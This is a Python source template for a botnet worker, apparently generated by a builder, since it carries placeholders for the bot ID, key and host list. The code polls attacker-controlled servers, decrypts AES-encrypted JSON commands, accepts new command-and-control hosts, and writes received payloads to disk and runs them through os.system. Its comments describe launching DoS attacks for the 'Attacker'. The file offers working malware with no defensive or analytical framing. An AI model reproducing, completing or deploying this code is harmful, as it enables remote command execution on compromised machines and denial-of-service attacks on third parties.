# worker_id=\"{botnet_id}\"
# key={key}
# host_list={host_list}
# webpage_location_dict={webpage_location_dict}
# time_interval={time_interval}
# reset_time_interval={reset_time_interval}
# executable_locations = {scheduler_hidder_win.exec_locations_format(required_locations)}
# botnet_name = '{build_info['botnet_Name']}{extension_to_use}''
# file_type = '{file_type}'
# exec_fileName = '{build_info['exec_fileName']}'

import time
import random
import http.client
import os
# For AES Decrypt
from Crypto.Cipher import AES
from Crypto import Random
import json
# import string
import base64
# from pathlib import Path

repeat = 1
repeat_counter = 0



unpad = lambda s: s[:-ord(s[len(s) - 1:])]

content_received = False
while True:
	# After Maximum of 1 hour[3600] a request is send to the Attacker server
	# If the Attacker want to Execute/Start a DoS Attack
	# The server will give all the details about how the attack will work

	# For testing
	time.sleep(reset_time_interval)

	for i in range(repeat):
		time.sleep(time_interval)

		if content_received == True:

			repeat_counter+=1
					
			try:
			
				if ('repeat' in content):
					if type(content['repeat'])==int:
						repeat = content['repeat']

				if ('time_interval' in content):
					if type(content['time_interval'])==int:
						# content['time_interval'] | Would Be in Seconds
						time_interval = content['time_interval']
				if ('reset_time_interval' in content):
					if type(content['reset_time_interval'])==int:
						reset_time_interval = content['reset_time_interval']
				if ('new_host_lst' in content):
					if (type(content['new_host_lst'])==tuple) or (type(content['new_host_lst'])==list):
						host_lst = content['new_host_lst']
				if ('webpage_location_dict' in content):
					if (type(content['webpage_location_dict'])==dict):
						webpage_location_dict = content['webpage_location_dict']
				if 'exec' in content:
					if type(content['exec'])==str:

						for loc in executable_locations:
							loc = loc.replace("\\", "/")
							try:
								if file_type=='executable':
									with open(loc+'/'+exec_fileName, 'w') as exec_command_file:
										exec_command_file.write(content['exec'])
									os.system(loc+'/'+botnet_name)

								elif file_type=='python':
									try:
										os.system(f'python {loc}/'+botnet_name)
									except:
										os.system(f'python3 {loc}/'+botnet_name)
							except:
								continue
			except:
				pass

		elif content_received == False:

			for host_data in host_list:

				if content_received == True:
					break

				elif content_received == False:

					try:
						for location in webpage_location_dict[host_data]:

							if content_received == False:
								# Request for HTML Content
								try:
									req = http.client.HTTPConnection(host_data, timeout=30)
									req.request("GET", f"/{location}/id={worker_id}")

									# Get Data Returned by the Attacker Controled Server
									req_data = req.getresponse()
									if (req_data.status >= 200) or (req_data.status < 300):

										html_content = req_data.read().decode("utf-8").strip()
										
										# Decode Cipher Text and Execute command at system level
										enc = base64.b64decode(html_content)
										iv = enc[16:32]
										
										cipher = AES.new(key, AES.MODE_CBC, iv)

										content = json.loads(bytes.decode(unpad(cipher.decrypt(enc[48:]))))

										if type(content)==dict:
											content_received = True
										print(content, content_received)
										

								except ConnectionRefusedError:
									continue
								except OSError:
									break
								except:
									continue
					except:
						continue


	if repeat_counter==repeat:
		content_received = False
		repeat_counter=0





